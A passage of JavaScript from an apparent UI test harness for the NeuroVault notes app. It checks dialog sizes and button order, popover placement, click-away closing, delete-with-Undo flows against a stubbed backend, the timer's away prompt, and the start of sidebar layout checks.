      A.readTime = `closed "${shut}" · open at 1× "${s1}" (${t1.total.toFixed(1)} s) · 2× "${s2}" (${t2.total.toFixed(1)} s) · real lengths "${s3}" · then 2× "${s4}" · closed again "${s5}"`;
      const clock = t => readClock(t.total) + ' listen', near = (a, b) => Math.abs(a - b) <= 1.01;
      if (!/min read$/.test(shut) || s1 !== clock(t1) || s2 !== clock(t2) || !near(t2.total, t1.total / 2) || !near(t1.pos + t1.left, t1.total) || s3 !== clock(t3) || t3.total < READ.pieces.length * 3 || s4 !== clock(t4) || !near(t4.total, t3.total / 2) || !/min read$/.test(s5))
        iss('Fix A read time while the player is open (47)', A.readTime);
      Object.assign(READ, keep); n7.md = md7; n7.html = null; S.modal = null; renderAll(); }
    DJ.recent = []; djDemo('ready'); S.ctx = null; S.modal = null; S.word = null; frame.style.width = ''; frame.style.height = ''; }
  /* ---- end Fix A ---- */
  /* ==== Build L (mockup R41): one dialog anatomy (title, one line, × on its line, Back · Cancel · others · main last, 440 / 720 / 920),
     the backdrop split, popovers 6px under their button and centred, a click away, Ctrl+K and the Brain Dump at one place, deleting
     with Undo for 10 seconds (and the backend only after), the timer's question with "Always do this and don't ask" ==== */
  { const L = out.numbers.buildL = { dialogs: {}, popovers: {}, centred: {}, flows: {} }, tick = () => new Promise(r => setTimeout(r, 0));
    await holdCommit();   // anything an earlier block left held
    const withApi = async (fake, fn) => { const was = window.pywebview, calls = [];
      window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { calls.push(n); return Promise.resolve(fake[n] ? fake[n](...a) : { status: 'success' }); } }) };
      try { await fn(calls); } finally { window.pywebview = was; } return calls; };
    // no dialog is drawn empty first (the ghost before the voice pill was one)
    const empties = [], mo = new MutationObserver(ms => ms.forEach(m => m.addedNodes.forEach(nd => { if (nd.nodeType !== 1) return;
      [nd, ...nd.querySelectorAll('.modal')].filter(e => e.matches('.modal')).forEach(md => { const b = md.querySelector('.modal-body, .settings-pane, .picker-list'); if (!b || !b.textContent.trim()) empties.push(md.dataset.dlg || md.className); }); })));
    mo.observe(app, { childList: true, subtree: true });
    const txt = b => b.textContent.replace(/\s+/g, ' ').trim();
    const dlgCheck = (key, size, keep) => {
      const m = app.querySelector('.modal[data-dlg]'); if (!m) { iss('Build L dialog not drawn', key); return null; }
      const f = {}, head = m.querySelector(':scope > .modal-head'), title = head?.querySelector('.modal-title'), x = head?.querySelector(':scope > .modal-x'), subs = head ? [...head.querySelectorAll('.modal-sub')] : [];
      const want = Math.min(DLG_SIZES[size], app.offsetWidth - 32); f.size = `${m.dataset.size} ${m.offsetWidth}px`;
      if (m.dataset.size !== size || Math.abs(m.offsetWidth - want) > 1) iss('Build L dialog size', `${key}: ${f.size}, want ${size} ${want}px`);
      if (!title || !x) iss('Build L dialog without a title and ×', key);
      else { f.xOff = half(cy(x) - (px(title).t + 12)); if (Math.abs(f.xOff) > 2) iss('Build L × off the title\'s line', `${key}: ${f.xOff}px`); }
      if (subs.length > 1 || subs.some(s => s.offsetHeight > 19 || s.getClientRects().length > 1)) iss('Build L more than one line under the title', key);
      const foot = m.querySelector(':scope > .modal-foot'), btns = foot ? [...foot.querySelectorAll(':scope > button')].filter(b => b.offsetWidth) : [];
      const roles = btns.map(b => b.dataset.dlgBtn || '?'), rank = { back: 0, cancel: 1, alt: 2, main: 3 }, ranks = roles.map(r => rank[r] ?? -1);
      f.buttons = btns.map(txt).join(' · '); f.roles = roles.join(' · ');
      if (ranks.some(r => r < 0) || ranks.some((r, i) => i && r < ranks[i - 1]) || roles.filter(r => r === 'main').length > 1) iss('Build L button order', `${key}: ${f.roles}`);
      const main = btns.find(b => b.dataset.dlgBtn === 'main'); if (main && (btns[btns.length - 1] !== main || !main.matches('.btn--primary, .btn--danger'))) iss('Build L main button not last', `${key}: ${f.buttons}`);
      if (btns.some(b => b !== main && b.matches('.btn--primary, .btn--danger'))) iss('Build L a second main button', `${key}: ${f.buttons}`);
      const back = btns.find(b => b.dataset.dlgBtn === 'back'); if (back && (btns[0] !== back || px(back).l - px(foot).l > 21)) iss('Build L Back not on the left', key);
      if (btns.length && !back && Math.abs(px(foot).r - px(btns[btns.length - 1]).r - 20) > 1) iss('Build L buttons not on the right', key);
      if (btns.some(b => b.matches('.btn--ghost, .btn--lg'))) iss('Build L ghost or large buttons in a dialog\'s row', `${key}: ${f.buttons}`);
      if (new Set(btns.map(b => Math.round(px(b).t))).size > 1) iss('Build L buttons on more than one row', `${key}: ${f.buttons}`);
      if (btns.some(b => b.offsetHeight !== 32)) iss('Build L dialog buttons not 32px', `${key}: ${btns.map(b => b.offsetHeight)}`);
      const bd = m.closest('.modal-backdrop'), closes = bd?.dataset.act === 'close-bg'; f.outside = closes ? 'closes' : 'stays';
      if (closes === keep) iss('Build L a click outside a dialog (keep the split)', `${key}: ${f.outside}`);
      const hb = getComputedStyle(head).backgroundColor; if (hb !== getComputedStyle(m).backgroundColor && hb !== 'rgba(0, 0, 0, 0)' && !head.matches('[data-set-head]')) iss('Build L a grey band on a dialog\'s head', key);   // Settings' dark band is the user's (2026-10-19)
      const scrolls = m.hasAttribute('data-scrolls'), line = parseFloat(getComputedStyle(head).borderBottomWidth) > 0; if (scrolls !== line) iss('Build L a line under the head only when it scrolls', `${key}: scrolls ${scrolls}, line ${line}`);
      inside('.modal', key); measure('buildL/' + key);
      return f;
    };
    const stickyId = () => { const s = D.stickies[0]; if (s) { s.open = true; s.out = false; } return s?.id; };
    const DIALOGS = [
      ['sync', 'sync', 'md', false, () => { S.modal = 'sync'; }],
      ['settings', 'settings', 'wide', false, () => { S.setSec = 'appearance'; S.modal = 'settings'; }],
      ['settings/alerts', 'settings', 'wide', false, () => { S.setSec = 'alerts'; S.modal = 'settings'; }],
      ['timer-away', 'timer-away', 'sm', true, () => { T.away = 4320; S.modal = 'timer-away'; }],
      ['move', 'move', 'md', false, () => { S.moveItem = { kind: 'note', id: note().id }; S.moveQ = ''; S.modal = 'move'; }],
      ['sticky-append', 'sticky-append', 'md', false, () => { S.pickSticky = stickyId(); S.moveQ = ''; S.modal = 'sticky-append'; }],
      ['sticky-attach', 'sticky-attach', 'md', false, () => { S.pickSticky = stickyId(); S.moveQ = ''; S.modal = 'sticky-attach'; }],
      ['voicerec', 'voicerec', 'md', true, () => { voiceClosed(); Object.assign(S.voice, { stage: 'nomodel', demo: true, status: { model: { name: 'base.en', size_mb: 160, present: false, source: 'https://huggingface.co/csukuangfj/sherpa-onnx-whisper-base.en', folder: 'C:/NeuroVault/models' } } }); S.modal = 'voicerec'; }],
      ['voice-ask', 'voice', 'md', true, () => { S.modal = voiceDemoA('ask', { keep: 'both', dest: 'dump' }); }],
      ['voice-check', 'voice', 'wide', true, () => { S.modal = voiceDemoA('check', { keep: 'both' }); }],
      ['wrap1', 'wrap', 'md', true, () => { S.modal = wrapDemo(1, {}); }],
      ['wrap2', 'wrap', 'md', true, () => { S.modal = wrapDemo(2, {}); }],
      ['wrap3', 'wrap', 'md', true, () => { S.modal = wrapDemo(3, {}); }],
      ['launch', 'launch', 'md', false, () => { WRAP.lp = lpFromSample(); S.modal = 'launch'; }],
    ];
    for (const sc of Object.keys(SCREENS)) for (const [key, id, size, keep, open] of DIALOGS) {
      set({ screen: sc, sample: 'typical', view: key === 'timer-away' ? 'timer' : 'notes', tstate: 'running', modal: null, side: true });
      open(); renderAll(); out.combos++;
      const m = app.querySelector('.modal[data-dlg]'); if (m?.dataset.dlg !== id) iss('Build L the wrong dialog drew', `${sc}/${key}: ${m?.dataset.dlg}`);
      const f = dlgCheck(`${sc}/${key}`, size, keep); if (sc === '1920x1080' && f) L.dialogs[key] = `${f.size} · × ${f.xOff}px off the title's line · ${f.buttons || 'no buttons'} (${f.roles || '-'}) · a click outside ${f.outside}`;
      // the click outside, as the split says: a dialog with nothing of yours closes, one with your work stays
      if (sc === '1920x1080') { const bd = app.querySelector('.modal-backdrop'); bd?.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
        const still = !!S.modal; if (still !== keep) iss('Build L a click outside a dialog did the wrong thing', `${key}: ${still ? 'stayed' : 'closed'}`); }
      if (S.modal === 'voice' || S.modal === 'voicerec') voiceClosed(); S.modal = null; T.away = null;
    }
    // the exact rows the locks name
    { const rowOf = open => { set({ screen: '1920x1080', view: 'notes', tstate: 'running', modal: null }); open(); renderAll(); const r = [...app.querySelectorAll('.modal-foot > button')].map(txt).join(' · '); S.modal = null; T.away = null; return r; };
      const rows = { away: rowOf(() => { T.away = 4320; S.modal = 'timer-away'; }), wrap2: rowOf(() => { S.modal = wrapDemo(2, {}); }), launch: rowOf(() => { WRAP.lp = lpFromSample(); S.modal = 'launch'; }), sync: rowOf(() => { S.modal = 'sync'; }) };
      L.flows.rows = Object.entries(rows).map(([k, v]) => `${k}: ${v}`).join(' | ');
      if (rows.away !== 'Count it as work · Count it as a pause' || !/^Back · Snooze \d+ min · Next$/.test(rows.wrap2) || rows.launch !== 'Not now · Launch first task and timer' || rows.sync !== 'Done') iss('Build L button rows', L.flows.rows); }

    // popovers and menus: 6px under their button (over it for the downloads' list), centred on it, 8px inside the window
    const DL = { items: [{ key: 'stt', label: 'Whisper base.en (speech to text)', state: 'downloading', done: 8e7, total: 1.6e8, message: '' }, { key: 'tts', label: 'Kokoro (read aloud)', state: 'queued', done: 0, total: 1.03e8, message: '' }] };
    const POPS = [
      ['more', () => { S.menu = true; }, '.header-actions > .menu', '[data-act="menu"]'],
      ['sort', () => { S.sortMenu = true; }, '.side-actions .menu', '[data-act="tree-sort"]'],
      ['tabs', () => { S.tabList = true; }, '.menu--tabs', '[data-act="tab-list"]', 'stress'],
      ['sticky', () => { S.stickyMenu = stickyId(); }, '.sticky .menu', '.sticky [data-act="sticky-menu"][aria-expanded="true"]'],
      ['downloads', () => { SETUP.dl = DL; S.dlPop = true; }, '.dl-pop', '.status-bar [data-act="setup-dl"]', null, true],
      ['task', () => { UI.view = 'tasks'; S.taskMenu = D.tasks.find(t => !t.done)?.id; }, '.tp-menu', '[data-act="task-menu"][aria-expanded="true"]'],
    ];
    const shut = () => { S.menu = false; S.sortMenu = false; S.tabList = false; S.stickyMenu = null; S.dlPop = false; S.taskMenu = null; SETUP.dl = null; };
    for (const sc of Object.keys(SCREENS)) for (const [key, open, sel, btnSel, sample, above] of POPS) {
      shut(); set({ screen: sc, sample: sample || 'typical', view: 'notes', modal: null, side: true, inspector: 'shown', zen: 'off', widgets: 'none' }); open(); renderAll(); out.combos++;
      const el = app.querySelector(sel), btn = [...app.querySelectorAll(btnSel)].find(b => b.offsetWidth);
      if (!el || !btn) { iss('Build L popover not drawn', `${sc}/${key}: ${!!el} ${!!btn}`); continue; }
      const e = px(el), b = px(btn), dx = half((e.l + e.r) / 2 - (b.l + b.r) / 2), up = e.b <= b.t + .5, gap = half(up ? b.t - e.b : e.t - b.b), W = app.offsetWidth;
      const card = el.closest('.sticky'), c = card && px(card);
      const atEdge = Math.abs(e.l - 8) < 1 || Math.abs(W - 8 - e.r) < 1 || (!!c && (Math.abs(e.l - c.l - 4) < 1.5 || Math.abs(c.r - 4 - e.r) < 1.5));
      L.popovers[`${sc}/${key}`] = `${Math.round(e.w)}px · ${dx === 0 ? 'centred' : atEdge ? 'at the window\'s edge' : dx + 'px off centre'} · ${gap}px ${up ? 'over' : 'under'} its button`;
      if (Math.abs(dx) > 1 && !atEdge) iss('Build L popover not centred on its button', `${sc}/${key}: ${dx}px`);
      if (key !== 'task' && Math.abs(gap - 6) > 1) iss('Build L popover not 6px from its button', `${sc}/${key}: ${gap}px`);
      if (key === 'task' && (gap < -1 || gap > 12)) iss('Build L task menu away from its ⋮', `${sc}/${key}: ${gap}px`);
      if (key === 'downloads' && !up) iss('Build L the downloads list not above its link', `${sc}: ${gap}`);
      if (e.l < 7.5 || e.r > W - 7.5 || e.t < -.5 || e.b > app.offsetHeight + .5) iss('Build L popover outside the window', `${sc}/${key}`);
      if (key === 'downloads' && app.querySelector('.modal-backdrop')) iss('Build L ongoing work dims the window', sc);
      measure(`buildL/${sc}/${key}`);
      if (sc !== '1920x1080') continue;
      // a click inside keeps it; a click away closes it (no redraw, so the click lands); a scroll or leaving the window closes the menus
      el.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true })); const kept = !!app.querySelector(sel);
      app.querySelector('.status-bar').dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true })); const closed = !app.querySelector(sel) && !POPOVERS.find(p => p.id === key)?.on();
      open(); renderAll(); app.querySelector('.view')?.dispatchEvent(new WheelEvent('wheel', { bubbles: true, deltaY: 40 })); const wheel = !app.querySelector(sel);
      open(); renderAll(); dispatchEvent(new Event('blur')); const blur = !app.querySelector(sel);
      const menu = key !== 'downloads'; L.flows[`away/${key}`] = `inside keeps ${kept} · a click away closes ${closed} · wheel ${wheel} · window blur ${blur}`;
      if (!kept || !closed || wheel !== menu || blur !== menu) iss('Build L click-away', `${key}: ${L.flows[`away/${key}`]}`);
      if (key === 'downloads') { open(); renderAll(); app.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); if (S.dlPop || app.querySelector(sel)) iss('Build L Esc closes the downloads\' list', ''); }
    }
    shut();
    // Ctrl+K and the Brain Dump: centred, at the same height
    for (const sc of Object.keys(SCREENS)) { set({ screen: sc, sample: 'typical', view: 'notes', modal: null });
      openPalette(); const pm = app.querySelector('.modal[data-dlg="palette"]'), p = pm && px(pm), pw = pm?.offsetWidth, psz = pm?.dataset.size; closeModal(); const bdm = BD.mode; BD.mode = 'centre'; openDump(); const dm = app.querySelector('.dump'), d = dm && px(dm); closeModal(); BD.mode = bdm;   // Build M round 6: the rule holds for the centred dialog; the free window goes where you put it
      if (!p || !d) { iss('Build L Ctrl+K or the Brain Dump not drawn', sc); continue; }
      const dy = half(d.t - p.t), cp = half((p.l + p.r) / 2 - app.offsetWidth / 2), cd = half((d.l + d.r) / 2 - app.offsetWidth / 2);
      L.centred[sc] = `top ${Math.round(p.t)} / ${Math.round(d.t)} (Δ ${dy}) · off centre ${cp} / ${cd} · ${Math.round(p.w)} / ${Math.round(d.w)}px`;
      if (Math.abs(dy) > 1 || Math.abs(cp) > 1 || Math.abs(cd) > 1) iss('Build L Ctrl+K and the Brain Dump not at one place', `${sc}: ${L.centred[sc]}`);
      if (psz !== 'md' || Math.abs(pw - Math.min(720, app.offsetWidth - 32)) > 1) iss('Build L Ctrl+K not medium', `${sc}: ${pw}`); }
    S.dumpDraft = '';

    // deleting: no confirm, gone at once, Undo for 10 seconds; the backend's delete only after them, never after Undo
    { set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null, side: true }); VAULT.live = true;
      const f = L.flows;
      await withApi({}, async calls => {
        const n = D.notes[1], i = D.notes.indexOf(n); S.noteId = n.id; renderAll();
        await askDelete('note', n.id); const bar = app.querySelector('.toast--undo'), a = `asked ${!!app.querySelector('.modal')} · gone ${!D.notes.includes(n)} · Undo ${!!bar?.querySelector('[data-act="hold-undo"]')} "${bar ? txt(bar) : ''}" · calls ${calls.filter(c => c !== 'save_note').length}`;
        bar?.querySelector('[data-act="hold-undo"]')?.click(); const b = `back at ${D.notes.indexOf(n)} of ${i} · open ${S.noteId === n.id} · bar ${!!app.querySelector('.toast--undo')} · calls ${calls.filter(c => c !== 'save_note').length}`;
        calls.length = 0; await askDelete('note', n.id); await holdCommit(); const c = `gone ${!D.notes.includes(n)} · calls ${calls.filter(x => x !== 'save_note').join(',')} · bar ${!!app.querySelector('.toast--undo')}`;
        f.note = `${a} | Undo: ${b} | 10 s: ${c}`;
        if (/asked true|gone false|Undo false|calls [1-9]/.test(a) || !/back at (\d+) of \1 · open true · bar false · calls 0/.test(b) || c !== 'gone true · calls delete_note · bar false') iss('Build L delete a note with Undo', f.note);
        // a folder with notes: all of it goes, Undo puts all of it back
        const fo = D.folders.find(x => !isProj(x.id) && D.notes.some(m => ancestors(m.folder).includes(x.id))), inside = D.notes.filter(m => ancestors(m.folder).includes(fo.id)), n0 = D.notes.length, f0 = D.folders.length;
        calls.length = 0; await askDelete('folder', fo.id); const gone = D.notes.length === n0 - inside.length && !D.folders.includes(fo); holdUndo();
        const sent = calls.filter(x => x !== 'save_note').length;
        f.folder = `${inside.length} notes · gone ${gone} · Undo: notes ${D.notes.length}/${n0}, folders ${D.folders.length}/${f0} · calls ${sent}`;
        if (!gone || D.notes.length !== n0 || D.folders.length !== f0 || sent) iss('Build L delete a folder with Undo', f.folder);
        // the next delete sends the one before at once
        const [x, y] = [D.notes[2], D.notes[3]]; calls.length = 0; await askDelete('note', x.id); await askDelete('note', y.id); await tick();
        const both = `${calls.filter(z => z !== 'save_note' && z !== 'log_client').join(',')} after the second · held ${HOLD.cur?.msg}`; holdUndo(); f.next = `${both} · Undo brings back the second ${D.notes.includes(y)}, the first stays gone ${!D.notes.includes(x)}`;
        if (calls.filter(z => z !== 'save_note' && z !== 'log_client').join() !== 'delete_note' || !D.notes.includes(y) || D.notes.includes(x)) iss('Build L one delete held at a time', f.next);
        HOLD.ms = 40; calls.length = 0; await askDelete('note', y.id); await wait(120); f.timer = `after its time: calls ${calls.filter(z => z !== 'save_note' && z !== 'log_client').join(',')} · held ${!!HOLD.cur} · bar ${!!app.querySelector('.toast--undo')}`; HOLD.ms = 10000;
        if (calls.filter(z => z !== 'save_note' && z !== 'log_client').join() !== 'delete_note' || HOLD.cur || app.querySelector('.toast--undo')) iss('Build L the delete goes through when the 10 seconds are up', f.timer);
      });
      // a delete the backend refuses comes back
      await withApi({ delete_note: () => ({ status: 'error', message: 'Database is locked.' }) }, async () => {
        const z = D.notes[2]; await askDelete('note', z.id); await holdCommit(); f.refused = `back ${D.notes.includes(z)} · "${S.toast}"`;
        if (!D.notes.includes(z) || !/back where it was/.test(S.toast || '')) iss('Build L a refused delete comes back', f.refused); S.toast = null; });
      // a project on the Timer page
      D.live = true; D.projects.push({ id: 'p-990', name: 'Build L sample', color: 1 });
      await withApi({}, async calls => { const p = proj('p-990'); deleteProject('p-990'); const gone = !D.projects.includes(p); holdUndo(); const back = D.projects.includes(p), c0 = calls.length;
        deleteProject('p-990'); await holdCommit(); f.project = `gone ${gone} · Undo ${back} (calls ${c0}) · then ${calls.join(',')}`;
        if (!gone || !back || c0 || calls.join() !== 'delete_project' || D.projects.includes(p)) iss('Build L delete a project with Undo', f.project); });
      D.live = false;
      // an attachment: the file and its embed go; Undo puts both back; then remove_attachment
      await withApi({ remove_attachment: () => ({ status: 'success', notes: [], inbox: [], inbox_removed: [] }), list_attachments: () => ({ status: 'success', files: D.atts, folder: '' }) }, async calls => {
        const nn = D.notes.find(m => noteEmbeds(m).length), file = noteEmbeds(nn)[0], line = `![[${file}]]`, a0 = D.atts.length;
        removeAtt(file); const gone = !nn.md.includes(line) && D.atts.length === a0 - 1 && !app.querySelector('.modal'); holdUndo(); const back = nn.md.includes(line) && D.atts.length === a0;
        removeAtt(file); await holdCommit(); f.attachment = `gone ${gone} · Undo ${back} · then ${calls.filter(c => c !== 'save_note').join(',')}`;
        if (!gone || !back || !calls.includes('remove_attachment')) iss('Build L remove an attachment with Undo', f.attachment); });
      // unused files: only the ones it showed go to the bin
      let sent = null;
      await withApi({ unused_attachments: () => ({ status: 'success', count: 1, bytes: 2048, files: [D.atts[0].file] }), recycle_unused_attachments: fl => { sent = fl; return { status: 'success', moved: 1, bytes: 2048, failed: [] }; },
        list_attachments: () => ({ status: 'success', files: D.atts, folder: '' }) }, async () => {
        const a0 = D.atts.length; await recycleUnused(); const gone = D.atts.length === a0 - 1 && !app.querySelector('.modal'); holdUndo(); const back = D.atts.length === a0;
        await recycleUnused(); await holdCommit(); f.unused = `gone ${gone} · Undo ${back} · sent ${JSON.stringify(sent)}`;
        if (!gone || !back || !Array.isArray(sent) || sent.length !== 1) iss('Build L unused files with Undo', f.unused); });
      VAULT.live = false; await holdCommit(); }

    // the timer's question: a pause first (focus, ×, Esc); "Always do this and don't ask" is kept, and then nothing asks
    await withApi({}, async calls => {
      set({ screen: '1920x1080', sample: 'typical', view: 'timer', tstate: 'running', modal: null }); D.live = false; D.tset.away = 'ask';
      const run = { state: 'running', away_seconds: 4320, project_id: null, mode: 'planned', target_seconds: 1500, elapsed_seconds: 300, pauses: [], milestones: [], task_id: null, pause_reason: null, paused_seconds: 0, is_over: false };
      recoverRunning(run); renderAll(); const focus = document.activeElement?.dataset.v, title = app.querySelector('.modal-title')?.textContent;
      document.activeElement?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true })); const esc = `${S.modal} "${S.status}"`;
      recoverRunning(run); renderAll(); app.querySelector('.modal-x')?.click(); const x = `${S.modal} "${S.status}"`;
      recoverRunning(run); renderAll(); app.querySelector('#taway-always').checked = true; app.querySelector('.modal-foot [data-act="taway"][data-v="work"]').click();
      const kept = `${D.tset.away} · saved ${calls.includes('save_settings')}`;
      recoverRunning(run); renderAll(); const asked = `${S.modal} "${S.status}"`;
      S.setSec = 'alerts'; set({ modal: 'settings' }); const seg = app.querySelector('[data-act="taway-set"][aria-pressed="true"]')?.dataset.v; app.querySelector('[data-act="taway-set"][data-v="ask"]')?.click(); const reset = D.tset.away;
      L.away = { title, focus, esc, x, kept, asked, settings: `${seg} → ${reset}` };
      if (title !== 'Count the 1h 12m as a pause?' || focus !== 'pause' || !/^null "The 1h 12m counts as a pause"/.test(esc) || !/^null "The 1h 12m counts as a pause"/.test(x)
        || kept !== 'work · saved true' || !/^null "NeuroVault was closed for 1h 12m: counted it as work, as your setting says"/.test(asked) || seg !== 'work' || reset !== 'ask') iss('Build L the timer\'s question', JSON.stringify(L.away));
      S.modal = null; T.away = null; });
    mo.disconnect(); L.flows.drawnEmpty = empties.length ? [...new Set(empties)].join(', ') : 'none';
    if (empties.length) iss('Build L a dialog drawn empty first', L.flows.drawnEmpty);
    set({ screen: '1920x1080', sample: 'typical', view: 'notes', tstate: 'running', modal: null }); S.toast = null; }
  /* ==== end Build L ==== */
  await checkBuildM();   // Build M
  await checkBuildO();   // Build O
  await checkKeys();   // Build M (QC 4 · 31): a shortcut for every rail and window-bar button
  await checkPanes();   // Build M · R44: tabs for notes only, modules dock beside a note
  await checkMindmap();   // Build M · R57: the mind map of a note
  await checkRound6();   // Build M · round 6: the Brain Dump window, the tight menu, the lists as cards and by day
  await checkBuildN();   // Build N
  await checkAskVoice();   // Build N · R69: speaking a question
  await checkQc87();   // QC 87
  await checkQc115();   // QC 115
  await checkFixA();   // fix round A
  await checkR68();   // R68
  await checkR69();   // R69
  await checkBuildP();   // Build P
  await checkBuildV();   // Build V: the vault on disk
  await checkDocViewer();   // Build DV (R66): the document viewer, from NeuroVault's window
  /* ---- restore ---- */
  Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
  loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
  { const aud = typeof nvAudible === 'function' ? nvAudible() : ['mute.js is not loaded']; if (!NV_MUTE?.on || aud.length) iss('QC 71: something can be heard under ?check=1', aud.slice(0, 4).join(' · ') || 'the mute is off'); }
  out.summary = `${out.combos} combinations on ${out.screens.length} screens, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`;
}
/* ==== Build M (mockups R42 and R46, locked 2026-10-17): Graph and Branches gone; the flat module sidebars and their tools row; the
   Timer's session page; the Timeline's rows; note history (versions, changes in the text, restore at once, the ⋮ entry, Settings).
   At 1366 × 768 and 3440 × 1440, in the four fonts where text decides the layout. Runs in the full sweep, or alone with ?check=1&only=buildm ==== */
async function checkBuildM() {
  const M = out.numbers.buildM = { gone: {}, side: {}, tools: {}, timer: {}, tl: {}, hist: {}, flows: {} }, bad = (k, v) => iss('Build M ' + k, v);
  const tick = (n = 4) => new Promise(r => { let i = 0; const f = () => ++i >= n ? r() : setTimeout(f, 0); setTimeout(f, 0); });
  const withApi = async (fake, fn) => { const was = window.pywebview, calls = [];   // a stall report (log_client, QC 95) isn't a call the check made
    window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { if (n !== 'log_client' || fake.log_client) calls.push([n, a]); return Promise.resolve(fake[n] ? fake[n](...a) : { status: 'success' }); } }) };
    try { await fn(calls); } finally { window.pywebview = was; } return calls; };
  const SC = ['1366x768', '3440x1440'], FONTS4 = FONTS.map(f => f[0]), shown = el => !!el && el.getClientRects().length > 0;
  const weightsOk = (sel, key) => { const w = new Set([...app.querySelectorAll(sel)].filter(shown).map(e => getComputedStyle(e).fontWeight)); if (w.size > 1) bad('one weight in every state', `${key} ${sel}: ${[...w]}`); };
  const type = (el, v) => { el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); };
  set({ screen: '1920x1080', theme: 'obsidian', font: 'opendyslexic', sample: 'typical', view: 'notes', side: true, inspector: 'shown', widgets: 'none', zen: 'off', modal: null, tstate: 'idle', tpage: 'session' });
  S.bm.q = { tasks: '', timer: '', history: '' }; S.bm.f = { tasks: {}, timer: {}, history: {} }; S.bm.pop = null; S.bm.todayOpen = false;

  // 1 · Graph and Branches are gone from the rail, the code, the menus and Ctrl+K; Timeline's icon is Route, not Timer's clock
  { const rail = [...app.querySelectorAll('.rail-nav .rail-btn')].map(b => b.dataset.v || b.getAttribute('aria-label'));
    const code = ['viewGraph', 'initGraph', 'buildGraph', 'recentre', 'sizeGraph', 'BASE_BRANCHES', 'BASE_COMMITS'].filter(k => { try { return typeof eval(k) !== 'undefined'; } catch (e) { return false; } });
    openPalette(); S.pal.q = '>'; renderAll(); const pal = S.pal.flat.map(x => x.label).join(' | '); closeModal(true);
    S.menu = true; renderAll(); const menu = app.querySelector('.app-header .menu')?.textContent || ''; const vh = app.querySelector('.app-header .menu [data-act="history"]'); S.menu = false; renderAll();
    const tl = app.querySelector('.rail-btn[data-v="history"] svg')?.innerHTML, tm = app.querySelector('.rail-btn[data-v="timer"] svg')?.innerHTML;
    M.gone = { rail: rail.join(' '), code: code.join(' ') || 'none', labels: Object.keys(VIEW_LABEL).join(' '), icons: ['graph', 'git'].filter(k => ICON[k]).join(' ') || 'none', S: ['gf', 'dist', 'repulse'].filter(k => k in S).join(' ') || 'none' };
    if (rail.slice(0, 4).join() !== 'notes,tasks,timer,history' || rail.some(v => /graph|git|Branches|Graph/.test(v))) bad('rail keeps four views (Graph and Branches gone)', M.gone.rail);
    if (code.length || 'graph' in VIEW_LABEL || 'git' in VIEW_LABEL || ICON.graph || ICON.git || 'gf' in S || 'branches' in D || 'commits' in D) bad('Graph and Branches code left', JSON.stringify(M.gone));
    if (/Graph|Branch/.test(pal + menu)) bad('Graph or Branches in Ctrl+K or the menu', pal.slice(0, 120));
    const norm = h => { const g = document.createElementNS('http://www.w3.org/2000/svg', 'svg'); g.innerHTML = h; return g.innerHTML; };
    if (!tl || tl === tm || tl !== norm(ICON.route)) bad('Timeline icon is Route, distinct from Timer', `${tl === tm ? 'same as Timer' : tl === norm(ICON.route) ? 'route' : 'other'}`);
    if (!vh || vh.hasAttribute('data-soon') || vh.disabled) bad('⋮ → Version history… is live', vh ? vh.outerHTML.slice(0, 100) : 'missing');
    if (!S.pal || PAL_COMMANDS.find(c => c[0] === 'Version history')?.[4]) bad('Ctrl+K Version history is live', ''); }

  // 2 · The module sidebars: no title row and no +; Notes' tools row (same height, the same 28px buttons, the search to the same edge); flat
  //     groups (no boxes) of 32px rows at one weight, the counts ending on one edge, the group names on the rows' text line
  for (const sc of SC) for (const font of (sc === '1366x768' ? FONTS4 : ['opendyslexic', 'system'])) {
    set({ screen: sc, font, view: 'notes', sample: 'typical' });
    const ns = app.querySelector('.side-actions'), nb = ns.querySelector('button'), nf = ns.querySelector('.field-search'), N = { h: half(px(ns).h), b: half(px(ns).b), btnL: half(px(nb).l), btnH: half(px(nb).h), searchR: half(px(nf).r), fieldH: half(px(nf.querySelector('.field')).h) };
    for (const view of ['tasks', 'timer', 'history']) {
      set({ view }); const key = `${sc}/${font}/${view}`, side = app.querySelector('#left-sidebar'), tools = side.querySelector('.bm-tools');
      measure(`buildM side ${key}`);
      if (side.querySelector('.side-head') || /Vault ·/i.test(side.textContent) || side.querySelector('[data-act="plus"]')) bad('no title row or + in a module sidebar', key);
      if (!tools) { bad('tools row missing', key); continue; }
      const btns = [...tools.querySelectorAll(':scope > button')], f = tools.querySelector('.field-search'), T0 = { h: half(px(tools).h), b: half(px(tools).b), btnL: half(px(btns[0]).l), btnH: [...new Set(btns.map(b => half(px(b).h)))].join('/'), searchR: half(px(f).r), fieldH: half(px(f.querySelector('.field')).h) };
      M.tools[key] = T0;
      if (btns.map(b => b.dataset.act).join() !== 'bm-filter,bm-proj') bad('tools row: filter, add project, search', `${key}: ${btns.map(b => b.dataset.act)}`);
      if (Math.abs(T0.h - N.h) > .5 || Math.abs(T0.b - N.b) > .5 || Math.abs(T0.btnL - N.btnL) > .5 || T0.btnH !== String(N.btnH) || Math.abs(T0.searchR - N.searchR) > .5 || T0.fieldH !== N.fieldH) bad('tools row matches the Notes row', `${key}: ${JSON.stringify(T0)} vs notes ${JSON.stringify(N)}`);
      if ([...btns].some(b => half(px(b.querySelector('svg')).w) !== 18)) bad('tools row icons 18px', key);
      const rows = [...side.querySelectorAll('.bm-row')].filter(shown), hs = [...new Set(rows.map(r => half(px(r).h)))], ends = [...new Set(rows.map(r => half(px(r.querySelector('.bm-row-count')).r)))];
      const heads = [...side.querySelectorAll('.bm-group-title')].map(h => half(px(h).l)), labels = rows.map(r => half(px(r.querySelector('.bm-row-label')).l));
